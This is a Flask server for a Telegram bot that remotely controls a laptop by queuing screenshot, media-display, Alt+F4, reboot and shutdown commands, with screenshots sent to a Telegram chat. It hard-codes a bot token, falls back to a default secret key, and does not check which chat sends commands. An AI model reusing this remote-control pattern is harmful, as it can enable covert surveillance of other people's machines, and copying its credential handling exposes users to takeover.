import os
import json
import uuid
import threading
import time
import requests
from datetime import datetime, timedelta
from flask import Flask, request, jsonify

app = Flask(__name__)

# ===== КОНФИГУРАЦИЯ =====
TOKEN = "8004274832:AAGbnNEvxH09Ja9OdH9KoEOFZfCl98LsqDU"
SECRET_KEY = os.environ.get('SECRET_KEY', 'DEFAULT_SECRET_KEY')
YOUR_CHAT_ID = os.environ.get('YOUR_CHAT_ID', 'ВАШ_CHAT_ID')
PORT = int(os.environ.get('PORT', 5000))
# ========================

TELEGRAM_API = f"https://api.telegram.org/bot{TOKEN}"
clients = {}
pending_commands = {}
user_state = {}  # Глобальное состояние пользователей

def send_telegram_message(chat_id, text, reply_markup=None):
    url = f"{TELEGRAM_API}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "HTML"
    }
    if reply_markup:
        payload["reply_markup"] = json.dumps(reply_markup)
    try:
        response = requests.post(url, json=payload)
        return response.json()
    except Exception as e:
        print(f"Ошибка отправки сообщения: {e}")
        return None

def create_keyboard():
    return {
        "inline_keyboard": [
            [{"text": "📸 Скриншот", "callback_data": "screenshot"}],
            [
                {"text": "🖼 Фото на экран", "callback_data": "play_photo"},
                {"text": "🎥 Видео на экран", "callback_data": "play_video"}
            ],
            [{"text": "❌ Alt+F4", "callback_data": "altf4"}],
            [
                {"text": "🔄 Перезагрузить", "callback_data": "reboot"},
                {"text": "⏹ Выключить", "callback_data": "shutdown"}
            ]
        ]
    }

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    data = request.json
    if data.get('key') != SECRET_KEY:
        return jsonify({'status': 'unauthorized'}), 401
    
    client_id = data.get('ip', 'unknown')
    clients[client_id] = {
        'last_seen': datetime.now(),
        'ip': data.get('ip', ''),
        'pc_name': data.get('pc_name', 'Unknown'),
        'status': 'online'
    }
    return jsonify({'status': 'ok'})

@app.route('/commands', methods=['GET'])
def get_commands():
    client_key = request.args.get('key')
    if client_key != SECRET_KEY:
        return jsonify([]), 401
    
    client_ip = request.remote_addr
    commands = pending_commands.get(client_ip, [])
    pending_commands[client_ip] = []
    return jsonify(commands)

@app.route('/complete', methods=['POST'])
def complete_command():
    data = request.json
    if data.get('key') != SECRET_KEY:
        return jsonify({'status': 'unauthorized'}), 401
    
    client_ip = request.remote_addr
    command_id = data.get('command_id')
    
    if client_ip in pending_commands:
        pending_commands[client_ip] = [
            cmd for cmd in pending_commands[client_ip] 
            if cmd.get('id') != command_id
        ]
    
    return jsonify({'status': 'ok'})

@app.route('/upload', methods=['POST'])
def upload_file():
    if request.form.get('key') != SECRET_KEY:
        return jsonify({'status': 'unauthorized'}), 401
    
    file = request.files.get('file')
    if file:
        try:
            # Отправка файла напрямую в Telegram
            url = f"{TELEGRAM_API}/sendPhoto"
            files = {'photo': file}
            data = {'chat_id': YOUR_CHAT_ID}
            response = requests.post(url, files=files, data=data)
            if response.status_code != 200:
                print(f"Ошибка отправки фото: {response.text}")
            return jsonify({'status': 'success'})
        except Exception as e:
            print(f"Ошибка отправки фото: {e}")
            return jsonify({'status': 'error'}), 500
    
    return jsonify({'status': 'no_file'}), 400

def send_menu(chat_id):
    send_telegram_message(chat_id, "🔒 Управление ноутбуком\nВыберите действие:", create_keyboard())

@app.route('/webhook', methods=['POST'])
def webhook():
    """Обработчик вебхуков от Telegram"""
    try:
        update = request.json
        if "callback_query" in update:
            handle_callback(update["callback_query"])
        elif "message" in update:
            handle_message(update["message"])
    except Exception as e:
        print(f"Ошибка в вебхуке: {e}")
    return jsonify({'status': 'ok'})

def handle_callback(query):
    chat_id = query["message"]["chat"]["id"]
    data = query["data"]
    
    try:
        client_id = next(iter(clients.keys()), None)
        
        if not client_id:
            send_telegram_message(chat_id, "⚠️ Нет подключенных устройств")
            return
        
        if data == 'screenshot':
            command = {
                'id': str(uuid.uuid4()),
                'type': 'screenshot',
                'timestamp': datetime.now().isoformat()
            }
            pending_commands.setdefault(client_id, []).append(command)
            send_telegram_message(chat_id, "📸 Запрошен скриншот...")
        
        elif data in ('play_video', 'play_photo'):
            media_type = 'video' if data == 'play_video' else 'image'
            text = "📹 Отправьте видео файл..." if media_type == 'video' else "🖼 Отправьте фото..."
            send_telegram_message(chat_id, text)
            # Сохраняем состояние
            user_state[chat_id] = {'awaiting_media': media_type, 'client': client_id}
        
        elif data == 'altf4':
            command = {
                'id': str(uuid.uuid4()),
                'type': 'altf4',
                'timestamp': datetime.now().isoformat()
            }
            pending_commands.setdefault(client_id, []).append(command)
            send_telegram_message(chat_id, "✅ Команда Alt+F4 отправлена")
        
        elif data == 'reboot':
            command = {
                'id': str(uuid.uuid4()),
                'type': 'reboot',
                'timestamp': datetime.now().isoformat()
            }
            pending_commands.setdefault(client_id, []).append(command)
            send_telegram_message(chat_id, "🔄 Команда перезагрузки отправлена")
        
        elif data == 'shutdown':
            command = {
                'id': str(uuid.uuid4()),
                'type': 'shutdown',
                'timestamp': datetime.now().isoformat()
            }
            pending_commands.setdefault(client_id, []).append(command)
            send_telegram_message(chat_id, "⏹ Команда выключения отправлена")
    
    except Exception as e:
        send_telegram_message(chat_id, f"⚠️ Ошибка: {str(e)}")

def handle_message(message):
    chat_id = message["chat"]["id"]
    
    # Проверяем, ожидаем ли мы медиафайл
    if chat_id in user_state and 'awaiting_media' in user_state[chat_id]:
        media_type = user_state[chat_id]['awaiting_media']
        client_id = user_state[chat_id]['client']
        
        try:
            file_id = None
            
            if media_type == 'image' and 'photo' in message:
                # Берем фото самого высокого качества
                file_id = message['photo'][-1]['file_id']
            elif media_type == 'video' and 'video' in message:
                file_id = message['video']['file_id']
            
            if file_id:
                # Получаем URL файла
                url = f"{TELEGRAM_API}/getFile?file_id={file_id}"
                response = requests.get(url).json()
                if response.get('ok'):
                    file_path = response['result']['file_path']
                    file_url = f"https://api.telegram.org/file/bot{TOKEN}/{file_path}"
                    
                    command = {
                        'id': str(uuid.uuid4()),
                        'type': 'media',
                        'media_type': media_type,
                        'url': file_url,
                        'timestamp': datetime.now().isoformat()
                    }
                    pending_commands.setdefault(client_id, []).append(command)
                    send_telegram_message(chat_id, f"✅ {'Фото' if media_type == 'image' else 'Видео'} отправлено на устройство")
            
            # Очищаем состояние
            del user_state[chat_id]
            send_menu(chat_id)
        
        except Exception as e:
            send_telegram_message(chat_id, f"⚠️ Ошибка обработки медиа: {str(e)}")
    
    # Обработка команды /start
    elif 'text' in message and message['text'] == '/start':
        send_menu(chat_id)

def cleanup_clients():
    while True:
        try:
            now = datetime.now()
            for client_id, client_data in list(clients.items()):
                if now - client_data['last_seen'] > timedelta(minutes=5):
                    del clients[client_id]
        except Exception as e:
            print(f"Ошибка очистки клиентов: {e}")
        time.sleep(300)

@app.route('/')
def home():
    return "PC Control Bot is running!"

def setup_webhook():
    """Установка вебхука при запуске"""
    # Получаем URL приложения из переменных окружения Render
    render_external_url = os.environ.get('RENDER_EXTERNAL_URL')
    if not render_external_url:
        print("RENDER_EXTERNAL_URL не установлен. Пропускаем установку вебхука.")
        return
    
    webhook_url = f"{render_external_url}/webhook"
    url = f"{TELEGRAM_API}/setWebhook"
    print(f"Устанавливаем вебхук: {webhook_url}")
    try:
        response = requests.post(url, json={"url": webhook_url})
        print(f"Результат установки вебхука: {response.json()}")
    except Exception as e:
        print(f"Ошибка установки вебхука: {e}")

if __name__ == '__main__':
    # Установка вебхука
    setup_webhook()
    
    # Запуск фоновых задач
    threading.Thread(target=cleanup_clients, daemon=True).start()
    
    # Запуск сервера
    from waitress import serve
    serve(app, host="0.0.0.0", port=PORT)
